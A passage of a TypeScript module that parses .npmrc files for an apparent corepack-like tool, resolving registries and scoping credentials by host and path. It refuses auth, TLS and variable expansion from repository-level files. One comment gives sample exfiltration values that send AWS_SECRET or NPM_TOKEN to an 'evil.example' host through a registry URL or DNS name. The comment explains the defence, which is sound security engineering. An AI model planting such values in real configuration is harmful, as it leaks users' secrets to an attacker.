/**
 * `.npmrc`, the constrained subset — §15.1 — and the registry decision it feeds
 * (§15.2, §15.3).
 *
 * §05.4 records that corepack reads no `.npmrc` at any level, which is #540 and
 * the single most-requested missing capability: a locked-down organisation
 * configures one registry, every other tool on the machine honours it, and this
 * one silently reaches the public registry from a machine whose policy forbids
 * exactly that.
 *
 * This is **not** npm-config compatibility. §15.1 lists seven keys; everything
 * else in the file is ignored, `${VAR}` expansion included. What makes reading
 * an attacker-controlled file safe at all is two rules, and they are the part of
 * this module worth reading twice:
 *
 * * **Auth is prefix-scoped by construction.** `//host/path/:_authToken` names
 *   the URLs it applies to, and {@link npmrcAuthorizationFor} attaches it only
 *   to a request whose host *and* path prefix match. That is stricter than
 *   §14.6's origin scoping, which is why `.npmrc` auth can be honoured without
 *   reintroducing the leak §14.6 exists to close.
 * * **A project-level file may set `registry` and `@scope:registry`, and
 *   nothing else.** npm honours project-level auth; this tool must not, because
 *   unlike npm it runs *before* the user has decided to trust the repository —
 *   `git clone && yarn install` executes this code with the clone's `.npmrc`
 *   already on disk. Auth and TLS keys from a project file are refused **and
 *   announced**, following `env.ts`'s `SECURITY_ONLY_FROM_ENVIRONMENT`
 *   precedent: a silently-dropped credential looks exactly like a broken tool.
 *
 * Nothing here is on the warm path. The module is reached only from `http.ts`,
 * `registry.ts`, `install.ts`, `tls.ts` and `info.ts` — all cold — and the whole
 * discovery is memoised per working directory, so a run that makes three
 * requests reads the files once.
 */

import { Buffer } from "node:buffer";
import { readFileSync } from "node:fs";
import { homedir } from "node:os";
import { dirname, join, resolve as resolvePath } from "node:path";
import {
  corepackSpelling,
  ENV,
  jupSpelling,
  registryVariableFor,
  SYSTEM_ENV,
} from "../config/env-vars.ts";
import { DEFAULT_REGISTRY } from "../config/keys.ts";
import { advisory } from "../errors.ts";
import { loadEnvFileFrom } from "../project/env.ts";

/* -------------------------------------------------------------------------- */
/* Types                                                                       */
/* -------------------------------------------------------------------------- */

/** §15.1's three tiers, lowest precedence first. */
export type NpmrcLevel = "global" | "user" | "project";

/** Which file, and which key in it, a setting came from. */
export interface NpmrcOrigin {
  path: string;
  level: NpmrcLevel;
  /** The key exactly as written in the file. */
  key: string;
}

/**
 * Who chose the registry a request is about to be sent to — §15.1's three tiers
 * and §15.2's variables collapsed to the one distinction that decides whether a
 * credential may ride along.
 *
 * `"project"` means the effective origin was named by a source that lives
 * **inside the repository**: a project-level `.npmrc`'s `registry` /
 * `@scope:registry`, or a `.jup.env` that set one of §15.2's registry
 * variables. §15.37 deliberately keeps those variables project-settable, on the
 * reasoning that redirecting a *download* is a project's own business — but the
 * user's `COREPACK_NPM_TOKEN` is not the project's business, and the two were
 * only ever coupled because §14.6 scopes credentials to "the configured
 * registry's origin" without asking who configured it. A cloned repository
 * could therefore name an origin and collect the token scoped to it, which is
 * precisely the pairing `env.ts`'s deny-list comment describes and only half
 * blocks: the token cannot come from the file, but the registry can, and one
 * hostile half is enough.
 *
 * Splitting the decision from the credential is the fix. The registry still
 * moves wherever the project says; the secrets do not follow it.
 *
 * The classification is a **deny-list**, not an allow-list — see
 * {@link registryTrustFor} for why that is the right way round here.
 */
export type RegistryTrust = "user" | "project";

export interface NpmrcAuthEntry {
  /** `//host[:port]/path/`, always ending in `/`. The credential's whole scope. */
  prefix: string;
  type: "token" | "basic";
  /** The `Authorization` header value. Never reported, never logged. */
  authorization: string;
  origin: NpmrcOrigin;
}

/** What one file contributed, for `jup info` (§15.30). */
export interface NpmrcFileReport {
  path: string;
  level: NpmrcLevel;
  /** Honoured keys, in the order they appear in the file. */
  keys: string[];
  /** Keys refused because a project-level file may not supply them (§15.1). */
  refused: string[];
}

export interface NpmrcConfig {
  /** Files actually read, **lowest precedence first**: global, user, project. */
  files: NpmrcFileReport[];
  registry?: { value: string; origin: NpmrcOrigin };
  /** `@scope` (with the `@`) -> registry. */
  scoped: Map<string, { value: string; origin: NpmrcOrigin }>;
  /** Longest prefix first, so the first match is the most specific. */
  auth: NpmrcAuthEntry[];
  cafile?: { value: string; origin: NpmrcOrigin };
  ca?: { value: string[]; origin: NpmrcOrigin };
  strictSsl?: { value: boolean; origin: NpmrcOrigin };
  /**
   * Every origin a **project-level** file named as a registry, including ones a
   * higher-precedence file went on to override. The winning value is not enough
   * on its own: what {@link registryTrustFor} asks is "did the repository put
   * this origin in front of us", and a project file that lost the precedence
   * race still did.
   */
  projectRegistryOrigins: Set<string>;
  /** The same, for the user and global files — the configuration the user owns. */
  userRegistryOrigins: Set<string>;
  /**
   * The closest project env file's variables, as `applyEnvFile` saw them.
   *
   * Kept here because provenance is not recoverable afterwards: `applyEnvFile`
   * merges `{...file, ...process.env}` into `process.env` and keeps no record
   * of which half a value came from, so by the time a request asks whether
   * `JUP_NPM_REGISTRY` was the user's or the repository's, the only remaining
   * evidence is the file itself.
   */
  projectEnvVars: Record<string, string>;
}

/* -------------------------------------------------------------------------- */
/* Messages                                                                    */
/* -------------------------------------------------------------------------- */

/**
 * This module keeps its own strings, as `info.ts`, `shims.ts` and `tls.ts` do.
 * Neither is in §12's normative table: §15.1 prescribes the behaviour and leaves
 * the wording open, and the shape follows `messages.ignoringEnvVar` so the two
 * refusals read alike.
 */
export const npmrcMessages = {
  /** §15.1 — a project file tried to supply auth or TLS. Say so; do not just drop it. */
  refusedProjectKey: (key: string, path: string) =>
    `! Ignoring ${key} from ${path}: a project-level .npmrc may only set registry and @scope:registry`,

  /** A `${VAR}` the environment does not define. npm fails outright; we drop the key. */
  unresolvedVariable: (key: string, path: string, variable: string) =>
    `! Ignoring ${key} from ${path}: it references \${${variable}}, which is not set`,

  /**
   * A project-level file tried to expand `${VAR}`.
   *
   * §15.1 already refuses every project key but `registry` and
   * `@scope:registry`, which leaves expansion as the last way a cloned
   * repository could read the environment it is running in — and it does not
   * merely read it, it *sends* it: `registry=https://evil.example/${AWS_SECRET}`
   * files the secret in an attacker's access log the moment the first metadata
   * request goes out, and `https://${NPM_TOKEN}.evil.example` files it in DNS
   * before that. Neither needs a credential, a network position, or a second
   * step. There is no legitimate project-level use to weigh against it: the
   * only value a repository can compute from the user's environment is a value
   * it was not given.
   *
   * The whole key is dropped rather than left literal — half a URL is not a
   * registry, and a silent `%24%7BVAR%7D` in a request path reads as a bug in
   * this tool rather than a refusal by it.
   */
  refusedProjectExpansion: (key: string, path: string) =>
    `! Ignoring ${key} from ${path}: a project-level .npmrc may not expand \${...} from the environment`,

  /**
   * A configured registry that is not an HTTP URL.
   *
   * §05.1 speaks HTTP and nothing else, so a `file:`, `data:` or `ftp:`
   * registry used to travel the whole way to `httpGet` and fail there as a
   * transport error — which reads as "the network is broken" for what is a
   * one-character configuration mistake. Refused at the point of decision
   * instead, and the tier below is used.
   */
  refusedRegistryScheme: (source: string, scheme: string) =>
    `! Ignoring ${source}: a registry must be an http: or https: URL, and this one is ${scheme}`,
} as const;

/** One warning per `<path>\0<key>`; a memoised load cannot repeat itself anyway. */
const warned = new Set<string>();

function warnOnce(message: string, seen: string): void {
  if (warned.has(seen)) return;
  warned.add(seen);
  advisory(message);
}

/** Test seam: forget both the parse cache and the warning log. */
export function resetNpmrcCache(): void {
  cache.clear();
  warned.clear();
}

/* -------------------------------------------------------------------------- */
/* Discovery                                                                   */
/* -------------------------------------------------------------------------- */

/**
 * Keys a **project-level** file may set. Everything else in §15.1's table is a
 * trust decision, and a cloned repository does not get to make it.
 */
function isProjectSafeKey(key: string): boolean {
  return key === "registry" || SCOPED_REGISTRY.test(key);
}

const SCOPED_REGISTRY = /^@[^\s:@]+:registry$/;

/**
 * The npm "global" file, `<prefix>/etc/npmrc`.
 *
 * npm's prefix is the runtime's installation prefix, which is why this is
 * `dirname(dirname(execPath))` on POSIX (`/usr/bin/node` -> `/usr`) and
 * `dirname(execPath)` on Windows, where the executable sits directly in the
 * prefix. `npm_config_prefix` — npm's own spelling, and what npm exports into a
 * lifecycle script — overrides it, with a bare `PREFIX` as the fallback.
 */
export function globalNpmrcPath(): string {
  const configured = process.env[SYSTEM_ENV.NPM_CONFIG_PREFIX] ?? process.env[SYSTEM_ENV.PREFIX];
  const prefix =
    configured !== undefined && configured !== ""
      ? configured
      : process.platform === "win32"
        ? dirname(process.execPath)
        : dirname(dirname(process.execPath));
  return join(prefix, "etc", "npmrc");
}

/**
 * The home directory, as §15.1 spells it: `$HOME`, or `%USERPROFILE%` on
 * Windows.
 *
 * The environment variable is read *first*, and `os.homedir()` is only the
 * fallback. §15.1 names the variables, and on a worker thread — which is where
 * this module's own tests run — `os.homedir()` consults the real process
 * environment rather than `process.env`, so a test that redirects `HOME` would
 * otherwise be silently ignored and every home-directory rule would go
 * unexercised.
 */
function homeDirectory(): string {
  const configured =
    process.platform === "win32"
      ? process.env[SYSTEM_ENV.USERPROFILE]
      : process.env[SYSTEM_ENV.HOME];
  if (configured !== undefined && configured !== "") return configured;
  return homedir();
}

/** `$HOME/.npmrc`, or `%USERPROFILE%\.npmrc`. */
export function userNpmrcPath(): string | undefined {
  const home = homeDirectory();
  return home === "" ? undefined : join(home, ".npmrc");
}

/**
 * §03.1's walk, applied to `.npmrc` instead of `package.json`.
 *
 * Directories that *are* a package inside `node_modules` are skipped, so a
 * dependency cannot supply one; the walk stops at the manifest that declares
 * `packageManager` (the project root), and never climbs into the user's home
 * directory, whose `.npmrc` is the **user** file and must not be reclassified as
 * project-level — that distinction is the whole of §15.1's security rule.
 *
 * The env file is collected on the same climb, for {@link registryTrustFor}'s
 * sake: it is the other thing inside a repository that can name a registry
 * (§15.37), and answering "who chose this origin" needs both halves. Only the
 * *closest* one is taken, exactly as §03.2 and `manifest.ts` apply it. That
 * costs at most two extra `openat` calls per walked directory, all of them on
 * this module's already-cold, already-memoised path — §01.3 measures the warm
 * run, which never reaches here.
 *
 * `.npmrc` paths are returned closest-first.
 */
function projectSources(cwd: string): { npmrc: string[]; envVars: Record<string, string> } {
  const found: string[] = [];
  let envVars: Record<string, string> | undefined;
  const home = homeDirectory();
  let dir = resolvePath(cwd);

  for (;;) {
    if (home !== "" && dir === home) break;

    if (!isInsideNodeModules(dir)) {
      const candidate = join(dir, ".npmrc");
      if (readIfPresent(candidate) !== undefined) found.push(candidate);
      if (envVars === undefined) {
        // `loadEnvFileFrom` rather than a second reader: it already honours
        // `JUP_ENV_FILE`, its `0` disable and the legacy name, and a provenance
        // check that disagreed with the loader about *which* file applies would
        // be worse than no check at all.
        const loaded = loadEnvFileFrom(dir);
        if (loaded !== null) envVars = loaded.vars;
      }
      if (declaresPackageManager(join(dir, "package.json"))) break;
    }

    const parent = dirname(dir);
    if (parent === dir) break;
    dir = parent;
  }

  return { npmrc: found, envVars: envVars ?? {} };
}

/** §03.1 step 1's regex, verbatim: only the package directory itself is skipped. */
function isInsideNodeModules(dir: string): boolean {
  return /[/\\]node_modules[/\\](@[^/\\]*[/\\])?([^@/\\][^/\\]*)$/.test(dir);
}

/** The §03.1 stop condition, read cheaply — a substring probe, never a full parse. */
function declaresPackageManager(manifest: string): boolean {
  const content = readIfPresent(manifest);
  if (content === undefined) return false;
  try {
    const parsed = JSON.parse(content) as unknown;
    return (
      typeof parsed === "object" &&
      parsed !== null &&
      !Array.isArray(parsed) &&
      Object.hasOwn(parsed, "packageManager")
    );
  } catch {
    // An unparseable manifest is somebody else's error to report (§03.1); for
    // the purposes of *this* walk it is still a project root.
    return true;
  }
}

function readIfPresent(path: string): string | undefined {
  try {
    return readFileSync(path, "utf8");
  } catch {
    return undefined;
  }
}

/* -------------------------------------------------------------------------- */
/* Parsing                                                                     */
/* -------------------------------------------------------------------------- */

/** One `key = value` pair, in file order. Arrays (`ca[]=`) arrive as repeats. */
export interface NpmrcPair {
  key: string;
  value: string;
  /** `true` when the key was written `key[]`, npm's array-append form. */
  array: boolean;
}

/**
 * An INI-ish line parser, which is all `.npmrc` is.
 *
 * Section headers are skipped rather than honoured: npm's own per-section
 * handling is scoped to registry-specific config we do not read, and treating
 * `[section]` as a namespace would silently change the meaning of the keys
 * below it.
 */
export function parseNpmrc(content: string): NpmrcPair[] {
  const pairs: NpmrcPair[] = [];

  for (const raw of content.split(/\r?\n/)) {
    const line = raw.trim();
    if (line === "" || line.startsWith("#") || line.startsWith(";") || line.startsWith("[")) {
      continue;
    }

    const eq = line.indexOf("=");
    if (eq === -1) continue;

    let key = line.slice(0, eq).trim();
    const value = unquote(line.slice(eq + 1).trim());
    if (key === "") continue;

    const array = key.endsWith("[]");
    if (array) key = key.slice(0, -2).trim();

    pairs.push({ key, value, array });
  }

  return pairs;
}

function unquote(value: string): string {
  if (value.length >= 2) {
    const first = value[0];
    const last = value[value.length - 1];
    if ((first === `"` || first === `'`) && first === last) {
      const inner = value.slice(1, -1);
      // npm writes `ca="-----BEGIN…\n…"`; the escapes are the file's, not JSON's,
      // but the two agree on the ones that appear in practice.
      return inner.replace(/\\n/g, "\n").replace(/\\r/g, "\r").replace(/\\"/g, `"`);
    }
  }
  return value;
}

/**
 * npm's `${VAR}` expansion, applied **only** to the keys §15.1 honours.
 *
 * A reference the environment does not define returns `undefined`, and the
 * caller drops the key: npm errors out, and the one thing that must not happen
 * is sending the literal text `${NPM_TOKEN}` to a registry as a bearer token.
 */
/**
 * The exact reference {@link expandVariables} substitutes, shared with the
 * project-tier refusal above so the two can never disagree about what counts as
 * an expansion.
 */
const EXPANSION = /\$\{[^}]+\}/;

export function expandVariables(value: string): { value: string } | { missing: string } {
  let missing: string | undefined;

  const expanded = value.replace(/\$\{([^}]+)\}/g, (_match, name: string) => {
    const found = process.env[name];
    if (found === undefined) {
      missing ??= name;
      return "";
    }
    return found;
  });

  return missing === undefined ? { value: expanded } : { missing };
}

/* -------------------------------------------------------------------------- */
/* Loading                                                                     */
/* -------------------------------------------------------------------------- */

const cache = new Map<string, NpmrcConfig>();

/** The auth key suffixes §15.1 lists, and nothing else. */
const AUTH_SUFFIXES = [":_authToken", ":_auth", ":username", ":_password"] as const;

/** §15.1's TLS keys, honoured from the user and global files only. */
const TLS_KEYS = new Set(["cafile", "ca", "strict-ssl"]);

function authSuffixOf(key: string): (typeof AUTH_SUFFIXES)[number] | undefined {
  if (!key.startsWith("//")) return undefined;
  return AUTH_SUFFIXES.find((suffix) => key.endsWith(suffix));
}

/** Is this a key §15.1 lists at all? Everything else is ignored outright. */
function isHonouredKey(key: string): boolean {
  return (
    key === "registry" ||
    SCOPED_REGISTRY.test(key) ||
    TLS_KEYS.has(key) ||
    authSuffixOf(key) !== undefined
  );
}

/**
 * Read every `.npmrc` that applies, in §15.1's order, and fold them into one
 * decision per setting.
 *
 * Memoised per working directory: a run makes several requests and each asks
 * for credentials, and re-reading three files per request would put filesystem
 * I/O on a path §01.3 measures.
 */
export function loadNpmrc(cwd: string = process.cwd()): NpmrcConfig {
  const key = resolvePath(cwd);
  const hit = cache.get(key);
  if (hit !== undefined) return hit;

  const config: NpmrcConfig = {
    files: [],
    scoped: new Map(),
    auth: [],
    projectRegistryOrigins: new Set(),
    userRegistryOrigins: new Set(),
    projectEnvVars: {},
  };

  // Lowest precedence first, so a later file simply overwrites: global, user,
  // then the project files from the *outermost* inward, leaving the closest one
  // — §15.1's "closest wins" — applied last.
  const sources: Array<{ path: string; level: NpmrcLevel }> = [
    { path: globalNpmrcPath(), level: "global" },
  ];
  const user = userNpmrcPath();
  if (user !== undefined) sources.push({ path: user, level: "user" });
  const project = projectSources(cwd);
  for (const path of project.npmrc.reverse()) sources.push({ path, level: "project" });
  config.projectEnvVars = project.envVars;

  const basic = new Map<string, { username?: string; password?: string; origin: NpmrcOrigin }>();

  for (const source of sources) {
    const content = readIfPresent(source.path);
    if (content === undefined) continue;

    const report: NpmrcFileReport = {
      path: source.path,
      level: source.level,
      keys: [],
      refused: [],
    };
    config.files.push(report);

    for (const pair of parseNpmrc(content)) {
      if (!isHonouredKey(pair.key)) continue;

      // The security rule. A cloned repository may point us at a registry; it
      // may not hand us a credential, nor decide which certificate authority
      // that credential is disclosed to.
      if (source.level === "project" && !isProjectSafeKey(pair.key)) {
        report.refused.push(pair.key);
        warnOnce(
          npmrcMessages.refusedProjectKey(pair.key, source.path),
          `${source.path}\0${pair.key}`,
        );
        continue;
      }

      // The second half of the security rule, and the half §15.1 does not state.
      // Refusing the *keys* a project may not set still leaves `registry` — the
      // one it may — able to read the whole environment through `${VAR}` and put
      // what it reads on the wire. See `npmrcMessages.refusedProjectExpansion`.
      // Detected with `expandVariables`'s own pattern so the two cannot drift:
      // whatever would have been substituted is exactly what is refused, and a
      // value holding a bare `${` that expansion would have left alone is left
      // alone here too.
      let value: string;
      if (source.level === "project") {
        if (EXPANSION.test(pair.value)) {
          report.refused.push(pair.key);
          warnOnce(
            npmrcMessages.refusedProjectExpansion(pair.key, source.path),
            `${source.path}\0${pair.key}\0expansion`,
          );
          continue;
        }
        value = pair.value;
      } else {
        const expanded = expandVariables(pair.value);
        if ("missing" in expanded) {
          warnOnce(
            npmrcMessages.unresolvedVariable(pair.key, source.path, expanded.missing),
            `${source.path}\0${pair.key}\0\${${expanded.missing}}`,
          );
          continue;
        }
        value = expanded.value;
      }

      const origin: NpmrcOrigin = { path: source.path, level: source.level, key: pair.key };
      if (apply(config, basic, pair, value, origin)) {
        report.keys.push(pair.key);
      }
    }
  }

  finishBasicAuth(config, basic);
  // Longest prefix first: the first match is the most specific one (§15.1).
  config.auth.sort((a, b) => b.prefix.length - a.prefix.length);

  cache.set(key, config);
  return config;
}

/** Fold one honoured pair into the config. Returns whether it contributed. */
function apply(
  config: NpmrcConfig,
  basic: Map<string, { username?: string; password?: string; origin: NpmrcOrigin }>,
  pair: NpmrcPair,
  value: string,
  origin: NpmrcOrigin,
): boolean {
  if (pair.key === "registry") {
    const registry = registryValue(value);
    if (registry === undefined) return false;
    config.registry = { value: registry.value, origin };
    noteRegistryOrigin(config, origin.level, registry.origin);
    return true;
  }

  if (SCOPED_REGISTRY.test(pair.key)) {
    const registry = registryValue(value);
    if (registry === undefined) return false;
    config.scoped.set(pair.key.slice(0, -":registry".length), {
      value: registry.value,
      origin,
    });
    noteRegistryOrigin(config, origin.level, registry.origin);
    return true;
  }

  if (pair.key === "cafile") {
    config.cafile = { value, origin };
    return true;
  }

  if (pair.key === "ca") {
    // `ca[]=` repeats append; a bare `ca=` replaces, matching npm's ini.
    const existing = pair.array && config.ca !== undefined ? config.ca.value : [];
    config.ca = { value: [...existing, value], origin };
    return true;
  }

  if (pair.key === "strict-ssl") {
    config.strictSsl = { value: value !== "false", origin };
    return true;
  }

  const suffix = authSuffixOf(pair.key);
  if (suffix === undefined) return false;

  const prefix = normalisePrefix(pair.key.slice(0, -suffix.length));
  if (prefix === undefined) return false;

  if (suffix === ":_authToken") {
    setAuth(config, { prefix, type: "token", authorization: `Bearer ${value}`, origin });
    return true;
  }

  if (suffix === ":_auth") {
    // Already `base64(user:pass)` on disk; npm stores it exactly as it is sent.
    setAuth(config, { prefix, type: "basic", authorization: `Basic ${value}`, origin });
    return true;
  }

  const entry = basic.get(prefix) ?? { origin };
  if (suffix === ":username") entry.username = value;
  else entry.password = decodeBase64(value);
  entry.origin = origin;
  basic.set(prefix, entry);
  return true;
}

/** A later, higher-precedence file replaces an entry for the same prefix. */
function setAuth(config: NpmrcConfig, entry: NpmrcAuthEntry): void {
  const existing = config.auth.findIndex((candidate) => candidate.prefix === entry.prefix);
  if (existing === -1) config.auth.push(entry);
  else config.auth[existing] = entry;
}

/** `username` + `_password` only become a credential once both halves are in. */
function finishBasicAuth(
  config: NpmrcConfig,
  basic: Map<string, { username?: string; password?: string; origin: NpmrcOrigin }>,
): void {
  for (const [prefix, entry] of basic) {
    if (entry.username === undefined || entry.password === undefined) continue;
    // A `_authToken` for the same prefix is the more specific statement and npm
    // prefers it, so a pair only fills a gap.
    if (config.auth.some((candidate) => candidate.prefix === prefix)) continue;
    setAuth(config, {
      prefix,
      type: "basic",
      authorization: `Basic ${Buffer.from(`${entry.username}:${entry.password}`).toString("base64")}`,
      origin: entry.origin,
    });
  }
}

function decodeBase64(value: string): string {
  return Buffer.from(value, "base64").toString("utf8");
}

function stripTrailingSlashes(value: string): string {
  return value.replace(/\/+$/, "");
}

/**
 * A configured registry, validated once: it must parse, and it must be a scheme
 * §05.1 can actually speak.
 *
 * The origin comes back with it because that is the unit
 * {@link registryTrustFor} compares — and `URL.origin` never carries userinfo,
 * so recording it cannot turn a `https://user:pass@host` registry into a
 * password in a `Set` that `jup info` might one day print.
 */
function registryValue(raw: string): { value: string; origin: string } | undefined {
  let parsed: URL;
  try {
    parsed = new URL(raw);
  } catch {
    return undefined;
  }
  if (parsed.protocol !== "http:" && parsed.protocol !== "https:") return undefined;
  return { value: stripTrailingSlashes(raw), origin: parsed.origin };
}

/** The scheme of a configured value, for the refusal message. Never the value itself. */
function schemeOf(raw: string): string {
  try {
    return new URL(raw).protocol;
  } catch {
    return "not a URL";
  }
}

/** File-tier bookkeeping for {@link registryTrustFor}. */
function noteRegistryOrigin(config: NpmrcConfig, level: NpmrcLevel, origin: string): void {
  const into = level === "project" ? config.projectRegistryOrigins : config.userRegistryOrigins;
  into.add(origin);
}

/**
 * `//host[:port]/path` in any of the spellings npm accepts, normalised to end
 * with exactly one `/`.
 *
 * The trailing slash is what makes {@link npmrcAuthorizationFor}'s `startsWith`
 * a *path-segment* test rather than a string test: without it, a credential
 * scoped to `//host/team` would also be sent to `//host/team-other`.
 *
 * Only the host is case-folded. A URL path is case-sensitive and the request
 * target is built without folding it, so folding it here would make a prefix
 * with any uppercase path — `//npm.pkg.github.com/OWNER/`, the spelling GitHub
 * Packages documents — unable to match the request it was written for.
 */
function normalisePrefix(raw: string): string | undefined {
  if (!raw.startsWith("//")) return undefined;
  const body = raw.slice(2).replace(/\/+$/, "");
  if (body === "") return undefined;
  const slash = body.indexOf("/");
  const host = slash === -1 ? body : body.slice(0, slash);
  const path = slash === -1 ? "" : body.slice(slash);
  return `//${host.toLowerCase()}${path}/`;
}

/* -------------------------------------------------------------------------- */
/* Auth                                                                        */
/* -------------------------------------------------------------------------- */

/**
 * §15.1 — the credential for this URL, or `undefined`.
 *
 * "A credential MUST only be attached to a request whose origin *and* path
 * prefix match." The scheme is deliberately **not** compared, which is npm's
 * behaviour and the one place this follows it: the key names a host and a path,
 * a registry reachable over both schemes is one registry, and a user who wrote
 * `//host/:_authToken` meant that host.
 */
export function npmrcAuthorizationFor(
  url: URL,
  config: NpmrcConfig = loadNpmrc(),
): NpmrcAuthEntry | undefined {
  if (config.auth.length === 0) return undefined;

  const target = `//${url.host.toLowerCase()}${url.pathname}`;
  // Sorted longest-first, so the first match is the most specific.
  return config.auth.find(
    (entry) => target.startsWith(entry.prefix) || `${target}/` === entry.prefix,
  );
}

/* -------------------------------------------------------------------------- */
/* The registry decision — §15.1 precedence, §15.2 per-source overrides         */
/* -------------------------------------------------------------------------- */

/** Where an effective registry setting came from, for `jup info` (§15.30). */
export interface RegistryDecision {
  /** The base URL, trailing slashes stripped (§05.2). */
  registry: string;
  /** Human-readable, and the exact variable or file/key that decided it. */
  source: string;
  kind: "per-source" | "environment" | "npmrc" | "built-in";
  /** Set when the decision came from a file. */
  origin?: NpmrcOrigin;
  /**
   * Whether the user's own configuration chose this registry, or the repository
   * did (§14.6, §15.37). `credentialsFor` gates the environment credential tier
   * on it, and the plaintext floor on it as well.
   */
  trust: RegistryTrust;
}

/**
 * Re-exported from `config/env-vars.ts`, where every variable name lives (§11).
 * `registry.ts` and `info.ts` ask this module for registry configuration, and a
 * per-package-manager variable name is part of that answer.
 */
export { registryVariableFor };

/**
 * A configured, non-empty value under either spelling, with the name that set it.
 *
 * An empty value means "not configured" for a registry URL — unlike a token,
 * where §11.2 makes the empty string meaningful — so both spellings are skipped
 * when empty rather than the empty one shadowing the other.
 */
function envSetting(name: string): { name: string; value: string } | undefined {
  for (const spelling of [jupSpelling(name), name]) {
    const value = process.env[spelling];
    if (value !== undefined && value !== "") return { name: spelling, value };
  }
  return undefined;
}

/**
 * {@link envSetting}, but only for a value that is a usable registry URL, with
 * the trust tier the variable's provenance implies.
 *
 * A value that is not an `http:`/`https:` URL is refused *here* rather than four
 * layers down in the transport, and the next tier is used — a `file:` registry
 * is a mistake, and falling back to the one the user had before is the least
 * surprising thing to do with a mistake.
 */
function envRegistrySetting(
  name: string,
  cwd?: string,
): { name: string; value: string; trust: RegistryTrust } | undefined {
  const configured = envSetting(name);
  if (configured === undefined) return undefined;

  const registry = registryValue(configured.value);
  if (registry === undefined) {
    warnOnce(
      npmrcMessages.refusedRegistryScheme(configured.name, schemeOf(configured.value)),
      `${configured.name}\0scheme\0${configured.value}`,
    );
    return undefined;
  }

  return {
    name: configured.name,
    value: registry.value,
    trust: suppliedByProjectEnvFile(loadNpmrc(cwd), configured.name, configured.value)
      ? "project"
      : "user",
  };
}

/**
 * Did the closest project env file supply this exact variable and value?
 *
 * `applyEnvFile` merges `{...fileVars, ...process.env}`, so the real environment
 * always wins and a variable it sets never shows the file's value. Comparing the
 * value is therefore what separates "the user exported this" from "the clone
 * shipped it". When both happen to spell the same URL the distinction does not
 * matter: the request goes to that origin either way, and calling it
 * project-supplied only withholds a credential from an origin the user could
 * still authorise by deleting the file — a conservative answer to a case that
 * does not arise.
 *
 * Both spellings are checked because §11 gives every variable two, and the file
 * may use either.
 */
function suppliedByProjectEnvFile(config: NpmrcConfig, name: string, value: string): boolean {
  const corepack = corepackSpelling(name);
  for (const spelling of [corepack, jupSpelling(corepack)]) {
    if (config.projectEnvVars[spelling] === value) return true;
  }
  return false;
}

/** The `@scope` of an npm package name, with the `@`, or `undefined`. */
function scopeOf(packageName: string | undefined): string | undefined {
  if (packageName === undefined || !packageName.startsWith("@")) return undefined;
  const slash = packageName.indexOf("/");
  return slash === -1 ? undefined : packageName.slice(0, slash);
}

/**
 * §15.1 + §15.2's precedence, in one place:
 *
 * ```
 * 1. COREPACK_REGISTRY_<NAME>                       per package manager
 * 2. COREPACK_NPM_REGISTRY
 * 3. .npmrc  @scope:registry, then registry         project > user > global
 * 4. the built-in default
 * ```
 *
 * `.jup.env` does not appear because it is not a separate tier: it has
 * already been merged into `process.env` by the time anything asks (§11.6), and
 * the real environment wins over it there.
 *
 * @param name The package manager the request is for, when there is one. Tier 1
 * is skipped without it.
 * @param packageName The npm package being fetched, when there is one. Tier 3's
 * scoped lookup needs it: §15.38 row 150 turns on `@yarnpkg:registry` alone.
 */
export function resolveRegistry(options?: {
  name?: string;
  packageName?: string;
  cwd?: string;
}): RegistryDecision {
  const name = options?.name;
  if (name !== undefined) {
    const configured = envRegistrySetting(registryVariableFor(name), options?.cwd);
    if (configured !== undefined) {
      return {
        registry: configured.value,
        source: configured.name,
        kind: "per-source",
        trust: configured.trust,
      };
    }
  }

  const npmRegistry = npmProtocolRegistry(options);
  return (
    npmRegistry ?? {
      registry: DEFAULT_REGISTRY,
      source: "built-in",
      kind: "built-in",
      // Ours, embedded, and the one origin no repository can have moved us to.
      trust: "user",
    }
  );
}

/**
 * Tiers 2 and 3 alone — an **npm-protocol** registry the user configured.
 *
 * Separate from {@link resolveRegistry} because §05.2 rewrite 1 turns on
 * precisely this: `repo.yarnpkg.com` is not an npm registry, so a configured
 * *npm* registry is what switches Yarn Berry to the `@yarnpkg/cli-dist`
 * package. `COREPACK_REGISTRY_YARN` deliberately does not: §15.2 defines it as
 * an origin replacement on Yarn's own distribution URLs — a mirror of
 * repo.yarnpkg.com, which is the thing #872 could not have.
 */
export function npmProtocolRegistry(options?: {
  packageName?: string;
  cwd?: string;
}): RegistryDecision | undefined {
  const environment = envRegistrySetting(ENV.NPM_REGISTRY, options?.cwd);
  if (environment !== undefined) {
    return {
      registry: environment.value,
      source: environment.name,
      kind: "environment",
      trust: environment.trust,
    };
  }

  const config = loadNpmrc(options?.cwd);

  const scope = scopeOf(options?.packageName);
  const scoped = scope === undefined ? undefined : config.scoped.get(scope);
  const chosen = scoped ?? config.registry;
  if (chosen === undefined) return undefined;

  return {
    registry: chosen.value,
    source: `.npmrc ${chosen.origin.key} (${chosen.origin.path})`,
    kind: "npmrc",
    origin: chosen.origin,
    // The file's own level *is* the trust tier: §15.1 already refuses every
    // other key from a project file, and `registry` is the one it lets through.
    trust: chosen.origin.level === "project" ? "project" : "user",
  };
}

/** The origin of the registry that ships with the binary; nothing can move it. */
const DEFAULT_REGISTRY_ORIGIN = new URL(DEFAULT_REGISTRY).origin;

/** §15.2's variables, both spellings, without needing to know the tool names. */
const REGISTRY_VARIABLE = /^(?:COREPACK|JUP)_(?:NPM_REGISTRY|REGISTRY_.+)$/;

/**
 * Registry origins the *environment* currently names, split by who put them
 * there.
 *
 * Scanning `process.env` rather than asking for a list of tool names is
 * deliberate: `COREPACK_REGISTRY_<NAME>` is open-ended by construction
 * (`registryVariableFor` will spell a variable for a name this build has never
 * heard of), so an enumeration of the built-in table would have holes exactly
 * where an unknown name is, which is where an attacker would put one.
 */
function envRegistryOrigins(config: NpmrcConfig): { user: Set<string>; project: Set<string> } {
  const user = new Set<string>();
  const project = new Set<string>();

  for (const [name, raw] of Object.entries(process.env)) {
    if (raw === undefined || raw === "" || !REGISTRY_VARIABLE.test(name)) continue;
    const registry = registryValue(raw);
    if (registry === undefined) continue;
    (suppliedByProjectEnvFile(config, name, raw) ? project : user).add(registry.origin);
  }

  return { user, project };
}

/**
 * Who chose the registry at `registryUrl` — the question `credentialsFor` asks
 * before it attaches anything.
 *
 * This is a **deny-list**, and the direction matters. An allow-list ("only
 * origins the user named may carry a credential") is the stricter rule and the
 * wrong one here, because the caller does not always *have* a registry decision
 * to hand: a tarball URL from `dist.tarball`, a redirect target, a test's local
 * server. Under an allow-list every one of those would silently lose its
 * credentials, which is a broken tool rather than a safe one — and the whole
